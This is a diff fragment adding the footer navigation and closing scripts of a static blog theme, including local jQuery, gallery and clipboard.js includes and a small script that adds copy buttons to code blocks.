+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/projects/">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
